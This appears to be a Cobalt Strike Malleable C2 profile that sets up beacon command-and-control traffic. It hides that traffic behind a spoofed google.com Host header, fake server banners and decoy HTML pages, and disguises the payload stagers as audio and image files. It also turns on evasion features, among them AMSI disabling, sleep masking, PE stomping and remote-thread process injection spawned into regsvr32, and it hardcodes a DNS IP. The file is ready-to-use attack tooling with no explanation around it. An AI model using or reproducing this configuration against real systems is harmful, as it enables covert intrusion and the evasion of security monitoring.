
set sample_name "17ae38f1";
set sleeptime "56880";
set jitter "41";
set tcp_port "9338";
set useragent "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202";

set dns_idle "58.62.243.159";
set dns_stager_subhost "ns0.";
set maxdns "240";
set dns_sleep "109";
set dns_ttl "3600";
set dns_max_txt "252";

set pipename "fullduplex_##";
set pipename_stager "rpc_##";

https-certificate {
	set CN "google.com";
	set O "pakistan";
	set L "lahore";
	set ST "pj";
	set C "pk";
	set validity "365";
}

http-config {
	header "Server" "cloudflare";
}

http-get "default" {

	set uri "/faq.js";

	client {

		header "Host" "google.com";
		header "Connection" "close";

		metadata {
			base64url;
			base64;
			prepend "made_write_conn=";
			header "Cookie";
		}

		parameter "trigger" "true";

	}
	server {

		header "Connection" "close";
		header "Content-Type" "text/html";
		header "Server" "apache";

		output {
			netbios;
			base64;
			prepend "<!DOCTYPE html><html class='no-js' lang='en-US'>  <head>    <meta http-equiv='X-UA-Compatible' content='IE=EDGE' />    <meta charset='utf-8'>    <meta name='viewport' content='width=device-width, initial-scale=1' />    <meta name='apple-itunes-app' content='app-id=1089249069'>    <title>Untitled</title><meta name='description' content='";
			print;
		}

	}

}
http-post "default" {

	set uri "/mk";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Content-Type" "text/plain";

		output {
			netbios;
			base64;
			print;
		}

		id {
			base64;
			prepend "__session__id=";
			header "Cookie";
		}

	}
	server {

		header "Status" "200";
		header "Connection" "close";
		header "Server" "Pagely Gateway/1.5.1";

		output {
			base64;
			print;
		}

	}

}
http-stager "default" {

	set uri_x86 "/components/templates.mp3";
	set uri_x64 "/components/ki.mp3";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Accept-Encoding" "gzip, br";

	}
	server {

		header "Content-Type" "audio/mpeg";
		header "Server" "Pagely Gateway/1.5.1";
		header "Connection" "close";

		output {
			print;
		}

	}

}
stage {

	set checksum "3";
	set userwx "false";
	set image_size_x86 "529028";
	set image_size_x64 "558037";
	set sleep_mask "true";
	set cleanup "true";
	set stomppe "true";
	set obfuscate "true";
	set compile_time "06 Jan 2021 00:05:36";
	set entry_point "82586";
	set name "systemintern.dll";

	transform-x86 {
		prepend "\x90\x90\x90\x90\x90\x90\x90";
		strrep "ReflectiveLoader" "SystemIntern";
	}

	transform-x64 {
		prepend "\x90\x90\x90\x90\x90\x90\x90";
		strrep "ReflectiveLoader" "SystemIntern";
	}

}

process-inject {

	set allocator "VirtualAllocEx";
	set min_alloc "16601";
	set userwx "false";
	set startrwx "false";

	transform-x86 {
		prepend "\x90\x90\x90\x90";
	}
	transform-x64 {
		prepend "\x90\x90\x90\x90";
	}

	execute {
		CreateThread;
		RtlCreateUserThread;
		CreateRemoteThread;
	}

}

post-ex {
	set spawnto_x86 "%windir%\\syswow64\\regsvr32.exe";
	set spawnto_x64 "%windir%\\sysnative\\regsvr32.exe";
	set obfuscate "true";
	set smartinject "true";
	set amsi_disable "true";
}

http-get "variant_1" {

	set uri "/ro.html /tab_shop.html /case.html";

	client {

		header "Host" "google.com";
		header "Connection" "close";

		metadata {
			netbiosu;
			base64;
			prepend "lu=";
			header "Cookie";
		}


	}
	server {

		header "Connection" "close";
		header "Content-Type" "text/html";
		header "Server" "nginx";

		output {
			netbios;
			base64;
			prepend "<!DOCTYPE html><!--[if IE 7]><html class='ie ie7' lang='en-US'><![endif]--><!--[if IE 8]><html class='ie ie8' lang='en-US'><![endif]--><!--[if !(IE 7) | !(IE 8)  ]><!--><html lang='en-US'><!--<![endif]-->    <head>        <meta charset='UTF-8' />        <meta name='viewport' content='width=device-width' />        <title>            Official Website        </title>        <meta name='description' content='Official Website' />        <meta name='keywords' content='Entertainment' />                    <meta property='og:title' content='' />            <meta property='og:url' content='https://www.";
			print;
		}

	}

}
http-post "variant_1" {

	set uri "/admin";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Accept-Language" "en-GB;q=0.9, *;q=0.7";
		header "Content-Type" "text/plain";

		output {
			netbios;
			base64;
			print;
		}

		id {
			base64;
			prepend "__session__id=";
			header "Cookie";
		}

	}
	server {

		header "Status" "200";
		header "Connection" "close";
		header "Server" "cloudflare";

		output {
			base64;
			print;
		}

	}

}
http-stager "variant_1" {

	set uri_x86 "/wp-includes/boxes.jpg";
	set uri_x64 "/components/mobile-ipad-home.jpg";

	client {

		header "Host" "google.com";
		header "Connection" "close";
		header "Accept-Encoding" "br";

	}
	server {

		header "Content-Type" "image/jpeg";
		header "Server" "nginx";
		header "Connection" "close";

		output {
			print;
		}

	}

}
